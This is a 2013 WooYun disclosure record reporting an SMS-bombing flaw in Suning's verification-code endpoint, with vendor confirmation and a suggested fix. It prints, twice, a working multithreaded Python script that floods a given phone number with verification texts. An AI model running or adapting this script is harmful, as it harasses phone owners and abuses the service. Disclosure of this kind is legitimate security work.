{"id": 61082, "wybug_id": "wooyun-2013-040837", "wybug_title": "苏宁易购短信验证码短信轰炸", "wybug_corp": "江苏苏宁易购电子商务有限公司", "wybug_author": "saar", "wybug_date": "2013-10-24 16:34", "wybug_open_date": "2013-12-08 16:34", "wybug_type": "网络设计缺陷/逻辑错误", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-11-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-11-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-08：\t细节向公众公开  简要描述： 通过不断发包发送短信。没设置间隔时间。 详细说明：  利用代码\n#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):  def __init__(self,func,args,name):    super(ThreadMessage,self).__init__();    self.func = func    self.args = args    self.name = name  def run(self):    self.result = self.func(*self.args);def sendMessage(n,number):  cookie = cookielib.CookieJar()  opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))  print \"Thread begin:\",n  i=0  while i<=number:    response = opener.open('https://member.suning.com/emall/SendMobileCodeCmd')    data={'mobile':sys.argv[1],'scenario':'mobileRegister'}    r=opener.open('https://member.suning.com/emall/SendMobileCodeCmd',urllib.urlencode(data))    i+=1    print \"send:\",idef main():  threads=[]  for i in range(1,10):    t = ThreadMessage(sendMessage,(i,100),sendMessage.__name__)    threads.append(t)  print \"main Thread begins at\",ctime()  for t in threads:    t.start();  for t in threads:    t.join();  print \"main thread ends at\",ctime();if __name__=='__main__':  main();\n\n\n   漏洞证明：  利用代码\n#! /usr/bin/env python#coding=utf8from  time import ctime,sleepimport urllib2import cookielibimport urllibimport sysimport threadimport threading;class ThreadMessage(threading.Thread):  def __init__(self,func,args,name):    super(ThreadMessage,self).__init__();    self.func = func    self.args = args    self.name = name  def run(self):    self.result = self.func(*self.args);def sendMessage(n,number):  cookie = cookielib.CookieJar()  opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie))  print \"Thread begin:\",n  i=0  while i<=number:    response = opener.open('https://member.suning.com/emall/SendMobileCodeCmd')    data={'mobile':sys.argv[1],'scenario':'mobileRegister'}    r=opener.open('https://member.suning.com/emall/SendMobileCodeCmd',urllib.urlencode(data))    i+=1    print \"send:\",idef main():  threads=[]  for i in range(1,10):    t = ThreadMessage(sendMessage,(i,100),sendMessage.__name__)    threads.append(t)  print \"main Thread begins at\",ctime()  for t in threads:    t.start();  for t in threads:    t.join();  print \"main thread ends at\",ctime();if __name__=='__main__':  main();\n\n\n   修复方案：  增加时间验证。   版权声明：转载请注明来源 saar@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2013-10-24 18:13 厂商回复： 感谢您对苏宁易购的关注，正在安排人员对此漏洞进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}